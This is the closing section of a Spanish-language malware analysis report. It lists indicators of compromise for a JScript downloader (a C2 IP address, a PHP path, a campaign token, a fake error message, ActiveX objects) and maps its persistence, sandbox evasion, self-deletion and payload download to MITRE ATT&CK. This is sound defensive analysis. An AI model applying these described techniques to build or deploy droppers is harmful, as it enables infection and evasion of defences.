<th>Cadena (String)</th>
<th>Descripción / Contexto</th>
</tr>
</thead>
<tbody>
<tr>
<td>217.28.218.217</td>
<td>La IP del servidor C2.</td>
</tr>
<tr>
<td>/NOPE/q64.php</td>
<td>La ruta del recurso en el servidor.</td>
</tr>
<tr>
<td>gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt</td>
<td>El IoC más fuerte. Es el valor del parámetro ?add=. Parece una clave de campaña o token único.</td>
</tr>
<tr>
<td>&amp;uid=</td>
<td>El parámetro que usa para enviar el identificador de la víctima.</td>
</tr>
<tr>
<td>&quot;The document is corrupted and cannot be opened&quot;</td>
<td>El mensaje de error falso.</td>
</tr>
<tr>
<td>Msxml2.ServerXMLHTTP</td>
<td>Objeto usado para la descarga silenciosa.</td>
</tr>
<tr>
<td>ADODB.Stream</td>
<td>Objeto usado para escribir el archivo binario en disco.</td>
</tr>
<tr>
<td>Scripting.FileSystemObject</td>
<td>Objeto para manipular archivos (borrarse a sí mismo).</td>
</tr>
<tr>
<td>WScript.Shell</td>
<td>Objeto para ejecutar comandos y leer variables de entorno.</td>
</tr>
<tr>
<td>MZ</td>
<td>&quot;La &quot;&quot;firma mágica&quot;&quot; que busca el script para validar si descargó un ejecutable (.exe).&quot;</td>
</tr>
</tbody>
</table>
<h3 id="mapeo-de-las-t%C3%A9cnicas-observadas-en-el-c%C3%B3digo-sobre-la-matriz-mitre-attck-enterprise"><strong>Mapeo de las técnicas observadas en el código sobre la matriz MITRE ATT&amp;CK Enterprise</strong></h3>
<h4 id="t%C3%A1ctica-execution---ta0002"><strong>Táctica: Execution - TA0002</strong></h4>
<p>El código intenta ejecutar código malicioso. Técnica: Command and Scripting Interpreter: JavaScript (T1059.007)</p>
<ul>
<li>Uso de objetos como ActiveXObject, WScript.Shell y la extensión .js confirman que este ataque depende del intérprete de scripts de Windows (wscript.exe o cscript.exe) para funcionar.</li>
</ul>
<h4 id="t%C3%A1ctica-persistence---ta0003"><strong>Táctica: Persistence - TA0003</strong></h4>
<p>El código intenta mantener su posición en el sistema tras un reinicio. Técnica: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)</p>
<ul>
<li>El script busca la carpeta especial número 7 de Windows, que corresponde a la carpeta &quot;Inicio&quot; (Startup), y se copia allí.</li>
</ul>
<h4 id="t%C3%A1ctica-defense-evasion---ta0005"><strong>Táctica: Defense Evasion - TA0005</strong></h4>
<p>El código intenta evitar ser detectado.</p>
<ul>
<li>
<p>Técnica: Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003)</p>
<ul>
<li>El bucle infinito que cuenta hasta 200 millones antes de ejecutar la descarga. Esto está diseñado para agotar el tiempo de análisis de sandboxes gratuitas (como ANY.RUN).</li>
</ul>
</li>
<li>
<p>Técnica: Obfuscated Files or Information (T1027)</p>
<ul>
<li>Todo el ejercicio de limpieza que se ha tenido que realizar para poder ver (y entender) algo en el código.</li>
</ul>
</li>
<li>
<p>Técnica: Indicator Removal on Host: File Deletion (T1070.004)</p>
</li>
<li>
<p>El script intenta borrarse a sí mismo (ScriptFullName) y al ejecutable descargado después de lanzarlo para no dejar pistas forenses.</p>
</li>
<li>
<p>Técnica: Masquerading (T1036)</p>
<ul>
<li>Usa el nombre flash_update.js para parecer legítimo en la carpeta de inicio.</li>
</ul>
</li>
</ul>
<h4 id="t%C3%A1ctica-command-and-control---ta0011"><strong>Táctica: Command and Control - TA0011</strong></h4>
<p>El código intenta comunicarse con sistemas bajo su control. Técnica: Application Layer Protocol: Web Protocols (T1071.001)</p>
<ul>
<li>Uso de peticiones HTTP/S estándar para comunicarse con el servidor C2.</li>
</ul>
<h4 id="t%C3%A1ctica-resource-development-ta0042-command-and-control"><strong>Táctica: Resource Development, TA0042, Command and Control</strong></h4>
<p>Cómo obtiene el código sus herramientas.</p>
<ul>
<li>Técnica: Ingress Tool Transfer (T1105).
<ul>
<li>La descarga del archivo .exe desde una fuente externa para introducirlo en la red de la víctima.</li>
</ul>
</li>
</ul>
<h4 id="tabla-res%C3%BAmen-de-t%C3%A9cnicas-observadas-sobre-la-matriz-mitre-attack"><strong>Tabla resúmen de técnicas observadas sobre la matriz MITRE ATTACK</strong></h4>
<table>
<thead>
<tr>
<th>ID Técnica</th>
<th>Nombre de la Técnica</th>
<th>Evidencia Observada en el código</th>
</tr>
</thead>
<tbody>
<tr>
<td>T1059.007</td>
<td>Interpreter: JavaScript</td>
<td>Ejecución vía WScript/ActiveX.</td>
</tr>
<tr>
<td>T1547.001</td>
<td>Startup Folder</td>
<td>Copia a Shell.NameSpace(7) como flash_update.js.</td>
</tr>
<tr>
<td>T1497.003</td>
<td>Time Based Evasion</td>
<td>Bucle while masivo (Delay execution).</td>
</tr>
<tr>
<td>T1027</td>
<td>Obfuscated Files</td>
<td>Strings rotos y Unicode (\u00XX).</td>
</tr>
<tr>
<td>T1070.004</td>
<td>File Deletion</td>
<td>FSO.DeleteFile() post-ejecución.</td>
</tr>
<tr>
<td>T1071.001</td>
<td>Application Layer Protocol: Web Protocols</td>
<td>Uso del objeto Msxml2.ServerXMLHTTP</td>
</tr>
<tr>
<td>T1105</td>
<td>Ingress Tool Transfer</td>
<td>Descarga de payload .exe desde IP remota.</td>
</tr>
<tr>
<td>T1036</td>
<td>Masquerading</td>
<td>&quot;Fake error message + nombre falso &quot;&quot;Flash Update&quot;&quot;.&quot;</td>
</tr>
</tbody>
</table>

</body>
</html>
